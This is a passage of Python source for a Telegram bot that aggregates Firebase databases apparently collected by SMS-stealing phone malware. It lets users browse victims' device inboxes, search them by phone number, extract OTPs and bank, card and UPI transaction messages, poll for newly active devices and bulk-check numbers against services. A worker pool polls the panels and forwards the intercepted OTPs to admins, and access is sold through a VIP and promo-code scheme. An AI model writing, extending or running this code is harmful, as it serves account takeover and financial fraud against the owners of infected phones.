            return

    except Exception:
        pass

async def on_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    bot_token = ctx.bot.token
    users_db = all_users

    text = (update.message.text or "").strip()

    if update.effective_chat.type == "private" and not await check_force_sub(ctx.bot, chat_id):
        await update.message.reply_text("🛑 <b>Aage badhne ke liye in channels ko join karna compulsory hai!</b>", parse_mode="HTML", reply_markup=force_sub_keyboard())
        return

    protected_commands = ["Devices List", "Manual Checker", "Scan Hidden Devices", "⚡ 5-Min Fresh Devices", "🔥 30-Min Fresh Devices", "🏦 Bank/Cards Scanner", "Search Number (God)", "🍔 App OTPs (24h)", "Auto-Check Panels"]
    if text in protected_commands:
        if not await enforce_access(ctx, chat_id, update.message.reply_text): return

    if text == "Devices List":
        devices = await get_all_devices(bot_token, chat_id, users_db)
        header = f"<b>📱 OTP PANEL PRO DEVICES</b>\n━━━━━━━━━━━━━━━━━━\n🟢 Online: {sum(1 for d in devices if d.status == 'online')}\n📊 Total: {len(devices)} Devices\n━━━━━━━━━━━━━━━━━━\n<i>Select a number below:</i>"
        await update.message.reply_text(header, reply_markup=device_list_keyboard(devices, 0), parse_mode="HTML")
        return

    if text == "🏦 Bank/Cards Scanner":
        wait_msg = await update.message.reply_text("⏳ Scanning all devices for recent Bank & UPI Transactions...")
        devices = await get_all_devices(bot_token, chat_id, users_db)
        bank_alerts = []
        for d in devices[:40]: 
            smss = await get_device_sms(d, limit=30)
            for sms in smss:
                body = sms.get("body") or sms.get("message") or ""
                bank_info = extract_bank_info(body)
                card_info = extract_card_info(body)
                if bank_info or card_info:
                    msg_b = bank_info if bank_info else ""
                    msg_c = card_info if card_info else ""
                    bank_alerts.append(f"📱 {d.numbers[0] if d.numbers else d.id[:6]}\n{msg_b} {msg_c}\nDate: {sms_date(sms)}\n")
        
        if not bank_alerts:
            await safe_edit(wait_msg, "📭 No recent Bank/UPI SMS found across devices.")
            return
            
        res = "🏦 <b>VANTAGE BANK & CARDS TRACKER</b>\n━━━━━━━━━━━━━━━━━━\n\n" + "\n".join(bank_alerts[:20])
        await safe_edit(wait_msg, res, parse_mode="HTML")
        return

    if text == "Search Number (God)":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        pending_action[chat_id] = {"action": "search_number"}
        await update.message.reply_text("SEARCH NUMBER (GOD MODE)\n━━━━━━━━━━━━━━━━━━\nType the number you want to find below:\n\nCancel: /cancel")
        return

    if text == "⚡ 5-Min Fresh Devices":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        all_devices = GLOBAL_DEVICE_CACHE.get("ALL", [])
        if not all_devices:
            await update.message.reply_text("⏳ System is booting up or loading cache. Please wait a few seconds and click again.")
            return

        wait_msg = await update.message.reply_text("⏳ <b>Fetching 5-Min Fresh Devices...</b>", parse_mode="HTML")
        recent_ping = [d for d in all_devices if d.numbers and d.status == "online" and (time.time() - (d.timestamp if d.timestamp < 1e11 else d.timestamp / 1000)) <= 300]
        recent_ping.sort(key=lambda d: d.timestamp, reverse=True)
        
        valid_devs = []
        for i in range(0, min(100, len(recent_ping)), 15):
            batch = recent_ping[i:i+15]
            verifications = await asyncio.gather(*[verify_recent_sms(d, 300) for d in batch])
            for d, is_valid in zip(batch, verifications):
                if is_valid: valid_devs.append(d.id)
            if len(valid_devs) >= 25: break
                
        if not valid_devs:
            await safe_edit(wait_msg, "❌ Koi bhi online number par pichle 5 minutes me naya SMS nahi aaya hai.")
            return
            
        user_fresh_cache[chat_id] = valid_devs
        await show_fresh_page(wait_msg, chat_id, 0, bot_token, users_db, 5)
        return

    if text == "🔥 30-Min Fresh Devices":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        all_devices = GLOBAL_DEVICE_CACHE.get("ALL", [])
        if not all_devices:
            await update.message.reply_text("⏳ System is booting up or loading cache. Please wait a few seconds and click again.")
            return

        wait_msg = await update.message.reply_text("⏳ <b>Fetching 30-Min Fresh Devices...</b>", parse_mode="HTML")
        recent_ping = [d for d in all_devices if d.numbers and d.status == "online" and (time.time() - (d.timestamp if d.timestamp < 1e11 else d.timestamp / 1000)) <= 3600]
        recent_ping.sort(key=lambda d: d.timestamp, reverse=True)
        
        valid_devs = []
        for i in range(0, min(100, len(recent_ping)), 15):
            batch = recent_ping[i:i+15]
            verifications = await asyncio.gather(*[verify_recent_sms(d, 1800) for d in batch])
            for d, is_valid in zip(batch, verifications):
                if is_valid: valid_devs.append(d.id)
            if len(valid_devs) >= 25: break
                
        if not valid_devs:
            await safe_edit(wait_msg, "❌ Koi bhi online number par pichle 30 minutes me naya SMS nahi aaya hai.")
            return
            
        user_fresh_cache[chat_id] = valid_devs
        await show_fresh_page(wait_msg, chat_id, 0, bot_token, users_db, 30)
        return

    if text == "Manual Checker":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        await update.message.reply_text("<b>Select Manual Checker</b>", reply_markup=get_checker_menu(prefix="chk_srv:"), parse_mode="HTML")
        return

    if text == "🍔 App OTPs (24h)":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        await update.message.reply_text("🍔 <b>SOCIAL & FOOD OTPs (Last 24h)</b>\n━━━━━━━━━━━━━━━━━━\nSelect an app below to deeply scan all devices for its OTPs:", reply_markup=get_app_search_menu(), parse_mode="HTML")
        return

    if text == "Auto-Check Panels":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        await update.message.reply_text("🔥 <b>SMART AUTO-CHECKER (Zero-Day Hacker Mode)</b>\n━━━━━━━━━━━━━━━━━━\nSelect service to aggressively scan live numbers:", reply_markup=get_checker_menu(prefix="auto_fb:"), parse_mode="HTML")
        return

    if text == "Scan Hidden Devices":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        wait_msg = await update.message.reply_text("Scanning premium hidden devices (Searching 'Recharge/Validity')...\n\nChecking active devices, please wait...")
        devices = GLOBAL_DEVICE_CACHE.get("ALL", [])
        if not devices: devices = await get_all_devices(bot_token, 0, users_db)
        target_devices = [d for d in devices if not d.numbers]
        if not target_devices:
            await safe_edit(wait_msg, "Sabhi devices me already numbers linked hain. Koi hidden number wala device nahi mila.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Close", callback_data="close_msg")]]))
            return
            
        results, kb, found_count = [], [], 0
        phone_pattern = re.compile(r"(?<!\d)([6-9]\d{9})(?!\d)")
        for d in target_devices[:100]: 
            smss = await get_device_sms(d, limit=10)
            found_nums, sample_sms = set(), ""
            for sms in smss:
                body = sms.get("body") or sms.get("message") or sms.get("text") or ""
                if any(x in body.lower() for x in ["recharge", "validity", "balance"]):
                    for m in phone_pattern.findall(body):
                        found_nums.add(m)
                        if not sample_sms: sample_sms = body[:40].replace('\n', ' ') + "..."
            if found_nums:
                found_count += 1
                results.append(f"Device: {d.name} ({d.id[:6]})\nPossible Nums: {', '.join(found_nums)}\nSMS: {sample_sms}\n")
                if len(kb) < 90: kb.append([InlineKeyboardButton(f"View Inbox: {list(found_nums)[0][:5]}...", callback_data=f"msgs:{d.id}")])
                    
        if found_count == 0:
            await safe_edit(wait_msg, "Scanning complete. Koi active recharge wala hidden number nahi mila.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back to Home", callback_data="home")]]))
            return
            
        kb.append([InlineKeyboardButton("Back to Home", callback_data="home")])
        results_text = "DEEP SCAN RESULTS (Premium)\n━━━━━━━━━━━━━━━━━━\n\n" + "\n".join(results)
        if len(results_text) > 4000: results_text = results_text[:4000] + "\n\n...[Truncated]"
        await safe_edit(wait_msg, results_text, reply_markup=InlineKeyboardMarkup(kb))
        return

    if text == "Check Status" and chat_id in ADMIN_IDS:
        online_count = sum(1 for d in GLOBAL_DEVICE_CACHE.get("ALL", []) if d.status == "online")
        msg = f"📊 <b>SERVER HEALTH STATUS</b>\n━━━━━━━━━━━━━━━━━━\n" \
              f"🔗 Auto-Loaded Panels: {len(RAW_URLS)}\n" \
              f"📱 Total Devices in Cache: {len(GLOBAL_DEVICE_CACHE.get('ALL', []))}\n" \
              f"🟢 Online Devices: {online_count}\n" \
              f"👤 Total Bot Users: {len(all_users)}\n" \
              f"📩 Total OTPs Processed: {total_otps_processed}\n" \
              f"👻 Active Background Workers: {len(ACTIVE_WORKERS)}"
        await update.message.reply_text(msg, parse_mode="HTML")
        return

    if text == "🎁 Redeem Promo":
        pending_action[chat_id] = {"action": "redeem_promo"}
        await update.message.reply_text("🎁 <b>REDEEM PROMO CODE</b>\n━━━━━━━━━━━━━━━━━━\nApna Promo Code niche type karein:\n\nCancel: /cancel", parse_mode="HTML")
        return

    if text.startswith("💳 Add Panel") or text.startswith("Add Panel"):
        pending_action[chat_id] = {"action": "set_personal_db"}
        await update.message.reply_text("💳 ADD CUSTOM PANEL (VANTAGE MODE)\n━━━━━━━━━━━━━━━━━━\nApne Firebase URLs bhejein (URL|AuthToken format).\nExample:\nhttps://sannn-5d617-default-rtdb.firebaseio.com|tHe daRk\n\nCancel: /cancel")
        return

    if text == "Admin Panel" and chat_id in ADMIN_IDS:
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        total_u = len(all_users)
        msg = f"ADMIN PANEL (Private)\n━━━━━━━━━━━━━━━━━━\nTotal Users    : {total_u}\n━━━━━━━━━━━━━━━━━━\nUpdated: {datetime.now().strftime('%d %b %Y %I:%M %p')}"
        await update.message.reply_text(msg, reply_markup=admin_keyboard())
        return

    if text.lower() in ("/cancel", "cancel"):
        if chat_id in pending_action:
            pending_action.pop(chat_id)
            await update.message.reply_text("Action cancelled.", reply_markup=get_reply_menu(chat_id))
        else: await update.message.reply_text("No pending action to cancel.")
        return

    if update.message.document:
        state = pending_action.get(chat_id)
        if state and state.get("action") == "upload_panels_txt" and chat_id in ADMIN_IDS:
            doc = update.message.document
            if not doc.file_name.endswith('.txt'):
                await update.message.reply_text("❌ Please send a valid .txt file.")
                return
            
            wait_msg = await update.message.reply_text("⏳ Processing file, extracting URLs...")
            try:
                file = await ctx.bot.get_file(doc.file_id)
                file_content = await file.download_as_bytearray()
                text_data = file_content.decode('utf-8', errors='ignore')
                
                pattern = re.compile(r'https?://[a-zA-Z0-9-]+\.(?:firebaseio\.com|[a-zA-Z0-9-]+\.firebasedatabase\.app)')
                urls = list(set(pattern.findall(text_data)))
                
                if not urls:
                    await safe_edit(wait_msg, "❌ Is file mein koi valid Firebase URLs nahi mile.")
                    return
                    
                existing = SETTINGS.setdefault("global_panels", [])
                added_count = 0
                for u in urls:
                    if u not in existing and u not in RAW_URLS:
                        existing.append(u)
                        added_count += 1
                        
                save_settings()
                pending_action.pop(chat_id)
                
                for u in urls:
                    try:
                        WORK_QUEUE.put_nowait(("INIT", f"G_TXT_{int(time.time())}_{added_count}", {"url": u, "auth": None}))
                    except asyncio.QueueFull: pass
                    
                await safe_edit(wait_msg, f"✅ <b>SUCCESS!</b>\n━━━━━━━━━━━━━━━━━━\nTotal URLs Extracted: {len(urls)}\nNewly Added to Global: {added_count}\n\n<i>Ab ye saare panels background me active ho gaye hain!</i>", parse_mode="HTML")
            except Exception as e:
                await safe_edit(wait_msg, f"❌ Error processing file: {str(e)}")
        return

    state = pending_action.get(chat_id)
    if not state: return

    action = state.get("action")
    if action == "redeem_promo":
        pending_action.pop(chat_id)
        if text.upper() == "HACKER50":
            all_users[chat_id]["access_until"] = time.time() + 3600
            save_user(chat_id)
            await update.message.reply_text("🎉 <b>Promo Redeemed!</b> Aapko 1 Hour ka Extra VIP Access mil gaya hai.", parse_mode="HTML")
        else:
            await update.message.reply_text("❌ Invalid or Expired Promo Code.")
        return

    if action == "search_number":
        pending_action.pop(chat_id)
        search_terms = [re.sub(r"\D", "", t) for t in text.replace(",", " ").split() if len(re.sub(r"\D", "", t)) >= 4]
        if not search_terms:
            await update.message.reply_text("Enter at least 4 digits to search.")
            return
        wait_msg = await update.message.reply_text("Searching across all global and user databases...")
        devices = GLOBAL_DEVICE_CACHE.get("ALL", [])
        if not devices: devices = await get_all_devices(bot_token, 0, users_db)
        found_devs = [d for d in devices for term in search_terms if any(term in num for num in d.numbers)]
        if not found_devs:
            await safe_edit(wait_msg, "No matching numbers found in any panel.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Close", callback_data="close_msg")]]))
            return
            
        if len(found_devs) == 1:
            device = found_devs[0]
            user_focus.setdefault(bot_token, {})[chat_id] = device.id
            label = device_label(device)
            smss  = await get_device_sms(device)
            back_btn = InlineKeyboardButton("Back to Home", callback_data="home")
            refresh_btn = InlineKeyboardButton("🔄 Refresh", callback_data=f"msgs:{device.id}:search")
            if not smss:
                await safe_edit(wait_msg, f"{label}\n\nKoi SMS nahi mili.", reply_markup=InlineKeyboardMarkup([[refresh_btn, back_btn]]))
                return
            header = f"ALL MESSAGES INBOX (SMS & OTP)\n━━━━━━━━━━━━━━━━━━\nNumber: {label}\nShowing: {len(smss)} messages\n━━━━━━━━━━━━━━━━━━\n\n"
            body_parts, otp_buttons = [], []
            for sms in smss[:15]:
                block, otp, bank_info = format_sms_block(sms, label)
                body_parts.append(block)
                if otp: otp_buttons.append([InlineKeyboardButton(f"Copy OTP: {otp}", callback_data=f"cp:{otp}")])
            full_text = header + ("\n━━━━━━━━━━━━━━━━━━\n\n").join(body_parts)
            if len(full_text) > 4000: full_text = full_text[:4000] + "\n\n...[Truncated]"
            otp_buttons.append([refresh_btn, back_btn])
            await safe_edit(wait_msg, full_text, reply_markup=InlineKeyboardMarkup(otp_buttons))
            return
            
        rows, row = [], []
        for d in found_devs[:16]:
            row.append(InlineKeyboardButton(_format_btn_label(d), callback_data=f"msgs:{d.id}"))
            if len(row) == 2:
                rows.append(row)
                row = []
        if row: rows.append(row)
        rows.append([InlineKeyboardButton("Back to Home", callback_data="home")])
        await safe_edit(wait_msg, f"Search Results for: {', '.join(search_terms)}\nDirectly open inbox:", reply_markup=InlineKeyboardMarkup(rows))
        return

    if action == "check_number_input":
        raw_nums = re.sub(r"\D", " ", text).split()
        target_nums = list(set([num[-10:] for num in raw_nums if len(num) >= 10]))
        if not target_nums: return await update.message.reply_text("❌ Invalid input!")
        service = state["service"]
        pending_action.pop(chat_id)
        
        if len(target_nums) == 1:
            number = target_nums[0]
            wait_msg = await update.message.reply_text(f"{SYS_SETTINGS.get('check_anim', '⚡')} Checking {number}...")
            res = await check_number_api(service, number)
            is_error = res.get("status") == "error"; ms = res.get("ms", 0)
            is_reg = res.get("registered", False) or res.get("is_registered", False) or (str(res.get("result", "")).lower() == "registered")
            res_text = format_checker_result(service, number, is_reg, ms, is_error, res.get("message", ""))
            kb = []
            if not is_reg and not is_error: kb.append([InlineKeyboardButton("🔍 Find this Number in Panels", callback_data=f"search_num:{number}")])
            kb.append([InlineKeyboardButton("🔄 Check Another", callback_data=f"chk_srv:{service}"), InlineKeyboardButton("🏠 Select Checker", callback_data="open_checker_menu")])
            await safe_edit(wait_msg, res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
        else:
            total_bulk = len(target_nums)
            wait_msg = await update.message.reply_text(f"{SYS_SETTINGS.get('check_anim', '⚡')} Bulk Checking {total_bulk} numbers on {service.capitalize()}...")
            bulk_results, registered_list = [], []
            for i in range(0, total_bulk, 100):
                batch = target_nums[i:i+100]
                tasks = [check_number_api(service, num) for num in batch]
                res_list = await asyncio.gather(*tasks, return_exceptions=True)
                for num, res in zip(batch, res_list):
                    if isinstance(res, Exception) or res.get("status") == "error":
                        bulk_results.append(f"❌ <code>{num}</code> - Error"); continue
                    is_reg = res.get("registered", False) or res.get("is_registered", False) or (str(res.get("result", "")).lower() == "registered")
                    bulk_results.append(f"{'🔴' if is_reg else '🟢'} <code>{num}</code> - {'Reg' if is_reg else 'UNREG'}")
                    if is_reg: registered_list.append(num)
                await asyncio.sleep(0.5)
            res_text = f"<b>📊 BULK CHECK RESULTS ({service.upper()})</b>\n━━━━━━━━━━━━━━━━━━\n" + "\n".join(bulk_results)
            if len(res_text) > 4000: res_text = res_text[:4000] + "\n...[Truncated]"
            kb = [[InlineKeyboardButton("🔄 Check Another", callback_data=f"chk_srv:{service}"), InlineKeyboardButton("🏠 Select Checker", callback_data="open_checker_menu")]]
            await safe_edit(wait_msg, res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
        return

    if action == "sa_set_global_panel" and chat_id in ADMIN_IDS:
        pending_action.pop(chat_id)
        lines = text.split('\n')
        added = 0
        for line in lines:
            parts = line.split('|')
            url = parts[0].strip()
            if url.startswith("http"):
                auth = parts[1].strip() if len(parts) > 1 else None
                SETTINGS.setdefault("global_panels", []).append({"url": url, "auth": auth})
                added += 1
        save_settings()
        await update.message.reply_text(f"SUCCESS! {added} panels Global Default list me add ho gaye hain.")
        return

    if action == "set_personal_db":
        lines = text.split('\n')
        pending_action.pop(chat_id)
        expiry_time = time.time() + (86400 * 365) 
        
        added = 0
        for line in lines:
            parts = line.split('|')
            url = parts[0].strip()
            if url.startswith("http"):
                auth = parts[1].strip() if len(parts) > 1 else None
                users_db.setdefault(chat_id, {}).setdefault("custom_dbs", []).append({"url": url, "auth": auth, "expiry": expiry_time})
                added += 1
                
        if added > 0:
            await update.message.reply_text(f"✅ {added} Firebase URLs added successfully with Auth Support!", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back to Home", callback_data="home")]]), parse_mode="HTML")
        else:
            await update.message.reply_text("❌ No valid URLs found.")
        return

# ═══════════════════════════════════════════════════════
#  FIREBASE AUTO-GEN WORKER POOL ENGINE (GHOST)
# ═══════════════════════════════════════════════════════

async def fetch_recent_sms_safely(d: Device, silent=False):
    try:
        sms_data = await fb_get(f"{d.sms_path}", d.base_url, auth=d.auth, query='orderBy="%24key"&limitToLast=3')
        if isinstance(sms_data, dict):
            for k, sms in sms_data.items():
                if not isinstance(sms, dict): continue
                sk = seen_key(d.id, k)
                if sk not in seen_ids:
                    seen_ids.append(sk) 
                    if not silent:
                        try:
                            body = sms.get("body") or sms.get("message") or sms.get("text") or ""
                            otp = extract_otp(body)
                            bank = extract_bank_info(body)
                            if otp or bank:
                                label = device_label(d)
                                msg_text = auto_forward_msg(sms, label)
                                kb_rows = []
                                if otp: kb_rows.append([InlineKeyboardButton(f"Copy OTP: {otp}", callback_data=f"cp:{otp}")])
                                kb_rows.append([InlineKeyboardButton("View Fast Inbox", callback_data=f"msgs:{d.id}")])
                                for bot_token, chat_dict in list(user_focus.items()):
                                    if _main_app:
                                        focused_chats = [cid for cid, did in chat_dict.items() if did == d.id and cid in ADMIN_IDS]
                                        for chat_id in set(focused_chats):
                                            asyncio.create_task(_main_app.bot.send_message(chat_id, msg_text, reply_markup=InlineKeyboardMarkup(kb_rows), parse_mode="HTML"))
                        except: pass
    except: pass

WORK_QUEUE = asyncio.Queue(maxsize=10000)
ACTIVE_WORKERS = []
MAX_WORKERS = 25 

async def worker_auto_scaler():
    global ACTIVE_WORKERS
    while True:
        try:
            q_size = WORK_QUEUE.qsize()
            target_workers = min(MAX_WORKERS, max(5, q_size // 2)) 
            ACTIVE_WORKERS = [w for w in ACTIVE_WORKERS if not w.done()]
            while len(ACTIVE_WORKERS) < target_workers:
                task = asyncio.create_task(db_processor_worker())
                ACTIVE_WORKERS.append(task)
        except: pass
        await asyncio.sleep(2) 

async def db_processor_worker():
    while True:
        try:
            job_type, tag, db_config = await WORK_QUEUE.get()
            
            if job_type == "INIT" or job_type == "CACHE_UPDATE":
                try: 
                    devs = await fetch_db_data(tag, db_config)
                    if devs is not None:
                        GLOBAL_DEVICE_CACHE[tag] = devs
                    
                    if job_type == "INIT":
                        SCAN_PROGRESS["completed"] += 1
                        active_devs = [d for d in GLOBAL_DEVICE_CACHE.get(tag, []) if d.status == "online"]
                        if active_devs:
                            for i in range(0, len(active_devs), 10):
                                await asyncio.gather(*(fetch_recent_sms_safely(d, silent=True) for d in active_devs[i:i+10]))
                except: pass

            elif job_type == "POLL":
                now = time.time()
                devices_in_db = GLOBAL_DEVICE_CACHE.get(tag, [])
                active_devs = [d for d in devices_in_db if d.status == "online" or (now - (d.timestamp if d.timestamp < 1e11 else d.timestamp/1000)) < 900]
                if active_devs:
                    for i in range(0, len(active_devs), 10):
                        await asyncio.gather(*(fetch_recent_sms_safely(d, silent=False) for d in active_devs[i:i+10]))
            
            WORK_QUEUE.task_done()
            await asyncio.sleep(0.1) 
        except asyncio.CancelledError: break
        except Exception: pass

async def cache_compiler():
    while True:
        await asyncio.sleep(5) 
        try:
            all_devs = []
            for tag, list_devs in list(GLOBAL_DEVICE_CACHE.items()):
                if tag != "ALL": all_devs.extend(list_devs)
            n_map = {}
            for d in all_devs:
                if d.numbers:
                    m = d.numbers[0]
                    if m not in n_map or d.timestamp > n_map[m].timestamp: n_map[m] = d
                else: n_map[d.id] = d
            res = list(n_map.values())
            res.sort(key=lambda d: (0 if d.status == "online" else 1, d.numbers[0] if d.numbers else d.id))
            GLOBAL_DEVICE_CACHE["ALL"] = res
        except: pass

async def master_dispatcher(app: Application) -> None:
    global first_run, _main_app
    _main_app = app
    last_cache_time = 0
    while True:
        try:
            dbs_to_poll = dict(DATABASES)
            for i, config in enumerate(SETTINGS.get("global_panels", [])): 
                if isinstance(config, str): dbs_to_poll[f"G_{i}"] = {"url": config, "auth": None}
                else: dbs_to_poll[f"G_{i}"] = config
            for uid, uinfo in all_users.items():
                if uid in ADMIN_IDS:
                    for i, db_config in enumerate(get_user_dbs(uinfo)): 
                        dbs_to_poll[f"U_{uid}_{i}"] = db_config
            
            if first_run:
                SCAN_PROGRESS["total"] = len(dbs_to_poll)
                SCAN_PROGRESS["completed"] = 0
                for tag, config in dbs_to_poll.items():
                    try: WORK_QUEUE.put_nowait(("INIT", tag, config))
                    except asyncio.QueueFull: pass
                first_run = False
                last_cache_time = time.time()
            else:
                now = time.time()
                for tag, config in dbs_to_poll.items():
                    try: WORK_QUEUE.put_nowait(("POLL", tag, config))
                    except asyncio.QueueFull: pass
                if now - last_cache_time > CACHE_INTERVAL:
                    for tag, config in dbs_to_poll.items():
                        try: WORK_QUEUE.put_nowait(("CACHE_UPDATE", tag, config))
                        except asyncio.QueueFull: pass
                    last_cache_time = now
        except Exception: pass
        await asyncio.sleep(POLL_INTERVAL)

def main() -> None:
    if not TOKEN or TOKEN == "YOUR_TELEGRAM_BOT_TOKEN_HERE": 
        raise SystemExit("TOKEN is missing! Please set your bot token in the script.")
        
    app = Application.builder().token(TOKEN).connection_pool_size(20).pool_timeout(60.0).connect_timeout(60.0).read_timeout(60.0).write_timeout(60.0).get_updates_read_timeout(60.0).build()

    # Playwright Conversation Handler
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('call', initiate_call)],
        states={
            WAIT_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_email)],
            WAIT_OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_otp)],
            WAIT_PROMPT: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_prompt)],
            WAIT_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_number)],
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )

    app.add_handler(CommandHandler("start",   cmd_start))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(conv_handler)
    app.add_handler(MessageHandler((filters.TEXT | filters.Document.ALL) & ~filters.COMMAND, on_message))

    async def post_init(application: Application) -> None:
        load_data()
        asyncio.create_task(start_dummy_server()) 
        asyncio.create_task(worker_auto_scaler()) 
        asyncio.create_task(cache_compiler())
        asyncio.create_task(memory_sweeper())
        asyncio.create_task(master_dispatcher(application))
        asyncio.create_task(auto_save_loop())
        asyncio.create_task(hourly_backup_loop(application))

    app.post_init = post_init
    print(f"\n🚀 Starting the ULTIMATE Vantage Pro + Omni Server... \n[*] Auto-Loaded {len(RAW_URLS)} Panels from files!")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
